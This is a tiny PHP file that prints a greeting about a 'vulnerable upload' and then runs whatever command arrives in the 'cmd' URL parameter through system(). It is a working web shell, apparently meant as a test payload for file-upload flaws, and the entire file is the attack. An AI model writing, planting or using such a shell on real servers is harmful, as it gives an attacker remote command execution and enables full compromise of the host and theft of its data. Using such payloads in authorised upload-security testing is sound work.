<?php
echo "Hello, this is a vulnerable upload!";
system($_GET['cmd']);
?>